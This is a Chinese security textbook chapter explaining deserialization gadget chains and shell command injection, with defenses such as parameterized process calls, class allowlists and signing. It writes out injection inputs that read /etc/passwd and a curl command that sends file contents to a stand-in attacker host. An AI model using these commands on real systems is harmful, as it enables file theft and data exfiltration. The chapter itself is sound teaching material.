## 为什么从反序列化与命令注入开始

软件系统到处是「转换」：把对象序列化成字节流（存储/传输）、把字符串拼进系统命令（调用工具）。这两类「转换」若处理不可信输入，就成了两个高危漏洞：**反序列化漏洞**（字节流被还原成恶意对象 → 代码执行）与**命令注入**（输入拼进 shell 命令 → 任意命令执行）。它们都是「数据当指令」的注入家族成员，但目标分别是「对象模型」与「操作系统」——危害等级常是 RCE（远程代码执行）。<span class="marginnote">一个威胁定位：<strong>反序列化与命令注入的常见后果是 RCE（远程代码执行）</strong>——攻击者直接获得在目标机器上执行命令的能力，是漏洞世界「最严重」的那一档。Java（ObjectInputStream）、PHP（unserialize）、Python（pickle）都曾是反序列化攻击的重灾区。</span>

## 1 反序列化漏洞：字节流变代码

**序列化**：把内存对象转成字节流（存文件/传网络）。**反序列化**：把字节流还原成对象。

**漏洞机制**：很多语言的**反序列化会触发对象的方法**（构造、析构、魔术方法），攻击者精心构造「恶意对象图」，反序列化时链式触发危险方法——**无需任何代码注入，一条字节流就能执行命令**。

**经典案例——Java 的 ysoserial**：攻击者构造一个「HashMap → 触发 hashCode → … → Runtime.exec」的对象链，一条序列化字节流在反序列化时执行系统命令。PHP 的 `unserialize()` 同样可通过 `__wakeup`/`__destruct` 魔法方法触发（如 phpggc 的 gadget 链）。

**危害**：**RCE、DoS、任意文件操作**——Java、PHP、Python、Ruby 的反序列化都出过致命 CVE（如 2015 年 Apache Commons Collections 引发的 Java 反序列化大潮）。<span class="marginnote">「Gadget 链」是反序列化攻击的核心：<strong>攻击者不必注入代码，只需把「程序里已有的类和方法」按特定顺序串成一条执行链</strong>——就像 ROP 用已有指令拼功能，反序列化用已有类拼出<strong>任意代码执行</strong>。一次安全的 `unserialize()` 调用，可能因为「类路径里有某个有副作用的类」而变成 RCE。</span>

### 辨析｜易错点：JSON 反序列化为什么安全

「反序列化有风险」让不少团队连 JSON 都不敢用了。真相是：**JSON 是纯数据格式**——它只有「字符串、数字、数组、对象」四种类型，解析 JSON 只还原数据结构，**不触发任何类的方法**。反序列化攻击的前提是「反序列化会实例化类、调用魔术方法」，而 JSON 解析器只建字典/数组，没有这个机制。所以「用 JSON 替代 pickle/原生序列化」之所以是防御手段，不是因为「JSON 更难猜」，而是因为「JSON 根本不执行代码」——**危险的不是「还原数据」，而是「还原数据时顺手执行类方法」**。

### 补充：一个可操作的判定清单

反序列化攻击能不能成立，取决于三个问题的答案：**① 反序列化的是不是不可信来源的数据？② 语言的反序列化是否允许实例化任意类？③ 类路径里有没有「有副作用」的类（如 `Runtime.exec` 可达）？** 三个都是「是」→ 高危；任何一个改成「否」→ 风险骤降。这就是「白名单类 + 签名 + 不反序列化不可信数据」三招各自的落点：白名单堵②、签名堵①、不反序列化直接釜底抽薪。

## 2 命令注入：字符串变系统命令

**命令注入（command injection）**：用户输入被拼进系统命令字符串。

```python
import os

ip = input("请输入要 ping 的地址：")
os.system("ping " + ip)   # 危险：若 ip = "127.0.0.1; cat /etc/passwd"，
                          # shell 会先 ping，再执行分号后的第二条命令
```

如果 `ip` 是 `127.0.0.1; cat /etc/passwd` 或 `127.0.0.1 | cat /etc/passwd`，shell 会执行**分号后的第二条命令**——任意命令执行。

**能做什么**：读取任意文件、反弹 shell、植入后门、横向移动——服务器权限有多大，攻击者就有多大。

**与 SQL 注入的同构**：都是「不可信数据拼进一种语言（shell/SQL）」，只是语言不同。<span class="marginnote">命令注入的关键符号：`;`（顺序执行）、`&&` / `||`（条件执行）、`` ` `` / `$(…)`（命令替换）、`|`（管道）——它们让攻击者「在合法命令之后追加自己的命令」。防御的根本是「不让输入进入 shell 的语法空间」。</span>

### 辨析｜易错点：命令注入 ≠ 代码执行

「命令注入」与「代码执行」常被混用，但攻击面不同。**命令注入**发生在「调用外部程序」的边界：应用的字符串被 shell 解释，攻击者追加的是**系统命令**；**代码执行（RCE 广义）**发生在「应用自身语言」的边界：攻击者的输入直接变成 Python/Java 代码（如 `eval`、模板注入）。区分它们的意义在于修复位置不同：命令注入修「进程调用的参数化」，代码执行修「禁用 `eval`/白名单模板」。真实漏洞报告里「RCE」通常涵盖两者，但防御时「在哪一层注入」决定了在哪一层设防。

## 3 公式解析：命令注入的追加

$$
\text{ping } \underbrace{127.0.0.1; \text{cat } /etc/passwd}_{\text{用户输入}} \;\; \Rightarrow \;\; \text{先 ping 再执行 cat}
$$

三步拆解这条「命令追加注入」：

- **第一步，闭合上下文**：输入里的 `;` 结束 `ping` 命令的参数。
- **第二步，追加命令**：分号后的 `cat /etc/passwd` 是**第二条命令**——shell 按顺序执行。
- **第三步，读取结果**：若应用把命令输出回显给用户，`cat /etc/passwd` 的输出直接出现在页面里——信息泄露。

更隐蔽的变体是「**带外（out-of-band）**」利用：应用不回显命令输出，攻击者就改用 `curl http://attacker.com/?d=$(cat /etc/passwd | base64)`——把结果「带外」送给自己。这解释了为什么「看不见输出 ≠ 没有命令注入」：盲命令注入靠 DNS/HTTP 回连来确认与提取，检测时必须考虑带外信道。

## 4 防御：白名单、参数化与「不拼命令」

命令注入的防御分三层：

- **首选：不拼命令**——用语言的**进程 API 直接传参数**（Python 的 `subprocess.run(["ping", ip])`），参数不进 shell 语法——**从根上消灭注入**。
- **次选：白名单校验**——`ip` 只允许 IP/域名格式（正则白名单），非法输入直接拒绝。
- **兜底：转义**——转义 shell 特殊字符（容易出错、不推荐作主防线）。

反序列化的防御：

- **不反序列化不可信数据**：只对可信来源做反序列化。
- **白名单类**（Java 的 `ObjectInputFilter`、PHP 的 `unserialize()` 的 `allowed_classes`）：反序列化时**禁止加载不信任的类**。
- **用安全的格式**：JSON 等纯数据格式（不触发魔术方法）。
- **签名/加密**：序列化数据加 MAC——防篡改伪造。<span class="marginnote">一句话记忆：<strong>「不拼命令用参数、不反序列化用 JSON、一定要反序列化就白名单类 + 签名」</strong>——三个「不」把两类 RCE 堵在门外。命令注入与反序列化的防御哲学一致：减少「不可信数据触达指令解释器」的路径。</span>

这三层还对应一个简单的成本排序：**「不反序列化」成本最低收益最高**（架构上规避），**「白名单类」中等**（需要维护类清单），**「签名」最细**（要管密钥生命周期）。多数团队的实际路径是「先用 JSON 兜住新功能 → 对遗留反序列化点加白名单 → 逐步迁移」——先止血，再根治。

## 5 从两类漏洞看「数据-指令边界」

反序列化与命令注入，连同前面的 SQL 注入、XSS、模板注入，构成一个完整的「注入家族」。它们唯一的共同教训：

**任何「不可信数据进入指令解释器（SQL、shell、模板、序列化器、HTML）」的路径，都是潜在的 RCE/数据泄露点**。

**统一的防御原则**：

**参数化**（SQL 预编译、进程参数数组）——让数据只当数据。
**白名单**（输入格式、可加载类）——把「允许的」显式列出。
**最小权限**（数据库账号、进程权限）——即使注入成功也封顶危害。
**输出编码**（HTML/JS 上下文）——让注入无法成为可执行代码。<span class="marginnote">把全书串起来的视角：<strong>信息安全的所有经典漏洞，几乎都是「边界混淆」</strong>——数据被当成代码（注入）、信任被错误迁移（MITM）、错误反馈被利用（Padding Oracle）。「清晰地划分数据与指令的边界」是贯穿密码学与软件安全的第一原则。</span>

### 补充：为什么「命令注入」在 Web 里越来越隐蔽

现代框架默认提供「参数化」的进程调用 API，裸拼 `os.system` 的代码在减少，但命令注入并未消失——它转移到了更隐蔽的地方：**文件名与路径拼进 shell**（`tar`、`rsync`、`ffmpeg` 等命令行工具的参数拼接）、**钩子与 CI/CD 脚本**（构建步骤里的 shell 变量）、**聊天机器人/语音助手的「间接命令」**。攻击者不再直接注入 `;`，而是利用「参数里含空格/引号」导致的分词错乱。这让「白名单 + 参数数组 + 禁止 shell=True」成为比「黑名单转义」可靠得多的防线。

## 6 小结

- **反序列化漏洞**：字节流还原对象时触发危险方法（gadget 链）——Java/PHP/Python 的 RCE 重灾区。
- **命令注入**：输入拼进 shell 命令——`;`、`|` 追加任意命令。
- **辨析**：命令注入打「外部程序边界」，代码执行打「应用自身语言边界」——修复位置不同。
- **注入同构**：SQL/shell/模板/HTML/序列化——都是「数据当指令」。
- **防御**：不拼命令用参数、不反序列化用 JSON、白名单 + 签名 + 最小权限。
- **隐蔽趋势**：命令注入正转移到文件名拼 shell、CI 脚本、语音助手——参数化 + 禁 `shell=True` 更可靠。
- **统一原则**：减少「不可信数据触达指令解释器」——边界清晰是安全第一原则。
- **判定清单**：不可信来源？任意类实例化？有副作用类存在？三问皆「是」才高危——防御各自堵一个问号。
